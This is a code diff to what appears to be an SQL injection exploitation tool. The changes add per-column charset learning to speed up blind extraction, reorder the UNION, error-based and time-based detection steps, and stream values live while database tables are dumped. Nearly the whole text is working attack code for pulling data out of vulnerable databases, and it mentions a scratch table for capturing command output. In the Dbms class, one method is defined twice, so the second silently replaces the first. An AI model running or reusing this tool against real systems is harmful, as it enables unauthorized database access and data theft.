@@ -70,7 +70,7 @@ RCE_TABLE = "bf_rce"              # scratch table that captures command output
 UMARK = "bfUc"                   # UNION column-reflection probe
 ULEFT, URIGHT = "bfUL", "bfUR"   # markers wrapped around a UNION-extracted value
 
-VERSION = "3.6.8"
+VERSION = "3.7.0"
 _RED, _RESET = "\033[1;31m", "\033[0m"   # bold red
 _ART = r"""
  ____  _      _____ _   _ _____  ______ ____  _      _____
@@ -169,11 +169,17 @@ class Dbms:
         # every value of ONE column in a single (short) request - the result rides back in the
         # error, which isn't length-capped, so this fits caps the per-row concat can't.
         return f"SELECT string_agg(cast({self.quote_ident(c)} as text),',') FROM {self.quote_ident(t)}"
+    def all_match(self, t, c, regex):     # smart-charset probe; None = unsupported on this DBMS
+        return None
     def q_cell(self, t, c, off):
         # last-resort, smallest read: one column / one row. Lean identifiers + LIMIT/OFFSET keep
         # it tiny so it survives caps the column-at-a-time query can't (one request per cell).
         tail = f" OFFSET {off}" if off else ""
         return f"SELECT {self.ident_lean(c)} FROM {self.ident_lean(t)} LIMIT 1{tail}"
+    def all_match(self, t, c, regex):
+        # do ALL values of the column fit this character class? (data-driven charset learning)
+        return (f"(SELECT bool_and(coalesce({self.quote_ident(c)}::text,'') ~ '^[{regex}]*$') "
+                f"FROM {self.quote_ident(t)})")
 
 
 class Postgres(Dbms):
@@ -586,10 +592,10 @@ class Oracle_:
 
     def fires(self, cond): raise NotImplementedError
 
-    def char(self, query, pos):
+    def char(self, query, pos, charset=None):
         code = self.dbms.code_expr(self.dbms.substr(query, pos))
-        # fast path: known alphabet (e.g. --charset hex) -> binary-search within it only
-        cs = getattr(self.a, "charset", None)
+        # fast path: a known alphabet (per-column smart charset, or --charset) -> binary-search it
+        cs = charset if charset is not None else getattr(self.a, "charset", None)
         if cs:
             lo, hi = 0, len(cs) - 1
             while lo < hi:
@@ -618,13 +624,13 @@ class Oracle_:
         except ValueError:
             return "�"
 
-    def char_confirmed(self, query, pos, tries=2):
+    def char_confirmed(self, query, pos, tries=2, charset=None):
         """Extract a char and verify it with an equality check; redo on disagreement.
         Cheap insurance against a single flipped response (esp. under --threads)."""
         code = self.dbms.code_expr(self.dbms.substr(query, pos))
         last = ""
         for _ in range(tries + 1):
-            last = self.char(query, pos)
+            last = self.char(query, pos, charset)
             if self.fires(f"{code}={ord(last)}"):
                 return last
         return last
@@ -870,22 +876,14 @@ def detect(target, a):
             # don't bail yet - only give up later if nothing identifies the backend.
             fp_inconclusive = True
 
-    # no boolean -> try time (also identifies DBMS)
-    time_ctx = None
-    if not bool_ctx and not (a.force_boolean or a.force_error):
-        d2, time_ctx = find_time(target, a, contexts, candidates)
-        if d2:
-            dbms = d2
-
-    # prefer UNION (reflected, ~1 request/value) when the DBMS is already known
+    # prefer UNION (reflected, ~1 request/value) when the DBMS is already known (boolean/--dbms)
     if dbms and not (a.force_boolean or a.force_time or a.force_error) and not a.no_union:
         u = find_union(target, a, dbms)
         if u:
-            return Detection("union-based", dbms, bool_ctx or time_ctx or BOOL_CONTEXTS[0],
-                             union=u)
+            return Detection("union-based", dbms, bool_ctx or BOOL_CONTEXTS[0], union=u)
 
-    # error-based: one-shot AND self-identifying, so it runs even with no boolean/time
-    # signal (the classic visible-error target). Probe the known DBMS, else all candidates.
+    # error-based: one request AND self-identifying. Tried BEFORE the (slow) sleep probe — on a
+    # visible-error target it returns instantly so we never pay for time-based probing.
     if not (a.force_boolean or a.force_time) and not a.no_error:
         ecands = [dbms] if dbms else candidates
         ed, err_ctx = find_error(target, a, contexts, ecands)
@@ -903,6 +901,13 @@ def detect(target, a):
         print("[!] --force-error: no reflected DB error found "
               "(try --allow-or, --dbms, or a different injection point).")
         return None
+
+    # time-based: LAST resort (each probe sleeps), so only after UNION and error have failed.
+    time_ctx = None
+    if not bool_ctx and not a.force_boolean:
+        d2, time_ctx = find_time(target, a, contexts, candidates)
+        if d2:
+            dbms = d2
 
     if not dbms:
         if fp_inconclusive:
@@ -1043,21 +1048,40 @@ def _bin_length(oracle, query, cap):
     return lo
 
 
-def read_scalar(target, det, a, query, cap=None):
-    """Extract one scalar with the detected technique (no checkpoint; for map/dump)."""
+def read_scalar(target, det, a, query, cap=None, charset=None, label=None):
+    """Extract one scalar with the detected technique (no checkpoint; for map/dump).
+    `charset` restricts the per-character search to a known alphabet; `label` streams the value
+    live as it is recovered, so slow (boolean/time) extraction shows progress instead of silence."""
     if det.technique == "union-based":
-        return union_read(target, det, query)
+        v = union_read(target, det, query)
+        if label: print(f"    {label}: {v if v is not None else ''}")
+        return v
     if det.technique == "error-based":
-        return extract_error(target, det.dbms, det.ctx, a, query)
+        v = extract_error(target, det.dbms, det.ctx, a, query)
+        if label: print(f"    {label}: {v if v is not None else ''}")
+        return v
     o = det.oracle
     n = _bin_length(o, query, cap if cap is not None else a.maxlen)
     if n == 0:
+        if label: print(f"    {label}: (empty)")
         return ""
     if a.threads > 1 and o.kind == "boolean-based":
         with ThreadPoolExecutor(max_workers=a.threads) as ex:
-            chars = list(ex.map(lambda p: o.char_confirmed(query, p), range(1, n + 1)))
-        return "".join(chars)
-    return "".join(o.char(query, p) for p in range(1, n + 1))
+            chars = list(ex.map(lambda p: o.char_confirmed(query, p, charset=charset), range(1, n + 1)))
+        v = "".join(chars)
+        if label: print(f"    {label}: {v}")
+        return v
+    if label:
+        sys.stdout.write(f"    {label}: "); sys.stdout.flush()
+    out = []
+    for p in range(1, n + 1):
+        c = o.char(query, p, charset)
+        out.append(c)
+        if label:
+            sys.stdout.write(c); sys.stdout.flush()
+    if label:
+        sys.stdout.write("\n"); sys.stdout.flush()
+    return "".join(out)
 
 
 def _split_list(s):
@@ -1136,6 +1160,36 @@ def map_mode(target, det, a):
     print(f"\n[i] dump a table with:  --dump <table>   (rows capped by --max-rows)")
 
 
+CHARSET_CLASSES = [   # narrow -> wide; learned from the DATA, so the result provably covers it
+    ("0-9", "0123456789"),
+    ("0-9a-f", "0123456789abcdef"),
+    ("0-9a-fA-F", "0123456789abcdefABCDEF"),
+    ("a-z", "abcdefghijklmnopqrstuvwxyz"),
+    ("a-z0-9", "abcdefghijklmnopqrstuvwxyz0123456789"),
+    ("a-zA-Z", "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
+    ("a-zA-Z0-9", "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"),
+    ("a-zA-Z0-9@._-", "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@._-"),
+]
+
+
+def learn_col_charset(target, det, a, table, col):
+    """Ask the DB which character class EVERY value of a column fits (bool_and(col ~ class)),
+    narrowest first. Data-driven, so the chosen alphabet provably covers all characters - no
+    guessing from column names, no widening. ~1-6 cheap probes that pay for themselves across
+    every row of the column. Returns a charset (incl. the ',' aggregate separator), or None to
+    fall back to the full per-character search (also the safe result if a probe can't fit a cap)."""
+    o = det.oracle
+    if o is None or o.kind not in ("boolean-based", "time-based"):
+        return None
+    for regex, chars in CHARSET_CLASSES:
+        cond = det.dbms.all_match(table, col, regex)
+        if cond is None:                  # DBMS without regex support
+            return None
+        if o.fires(cond):
+            return "".join(sorted(set(chars + ",")))   # sorted+unique: char() binary-searches it
+    return None
+
+
 def dump_mode(target, det, a):
     table = a.dump
     cols = _split_list(read_scalar(target, det, a, det.dbms.q_columns(table)))
@@ -1148,9 +1202,16 @@ def dump_mode(target, det, a):
     # once (the result comes back in the error, which isn't length-capped — only the injected
     # query is). Far shorter than concatenating all columns per row, so it fits caps the
     # row-at-a-time approach can't, and it's gentle: one request per column.
+    print(f"\n=== DUMP: {table} ===")
+    print(f"columns ({len(cols)}): {', '.join(cols)}")
+    # per-character techniques are slow: auto-learn a tight per-column charset (unless --charset
+    # is pinned) and stream each value live, so progress is visible instead of a long silence.
+    smart = (not a.charset and det.oracle is not None
+             and det.oracle.kind in ("boolean-based", "time-based"))
+    col_cs = {c: (learn_col_charset(target, det, a, table, c) if smart else None) for c in cols}
     coldata, truncated = {}, []
     for c in cols:
-        raw = read_scalar(target, det, a, det.dbms.q_col(table, c))
+        raw = read_scalar(target, det, a, det.dbms.q_col(table, c), charset=col_cs[c], label=c)
         coldata[c] = raw.split(",") if raw else []
         if not raw:
             truncated.append(c)
@@ -1160,15 +1221,14 @@ def dump_mode(target, det, a):
         print("[*] per-column query still too long for the cap — per-cell extraction ...", flush=True)
         rows = []
         for off in range(a.max_rows):
-            cells = [read_scalar(target, det, a, det.dbms.q_cell(table, c, off)) or "" for c in cols]
+            cells = [read_scalar(target, det, a, det.dbms.q_cell(table, c, off),
+                                 charset=col_cs[c], label=f"{c}[{off}]") or "" for c in cols]
             if not any(cells):
                 break
             rows.append(cells)
         coldata = {c: [r[j] for r in rows] for j, c in enumerate(cols)}
         truncated = []
     nrows = min(max((len(v) for v in coldata.values()), default=0), a.max_rows)
-    print(f"\n=== DUMP: {table} ===")
-    print(f"columns ({len(cols)}): {', '.join(cols)}")
     print(f"rows: {nrows}")
     if nrows == 0:
         print("[!] no rows extracted — empty table, or even the per-column query is too long for")
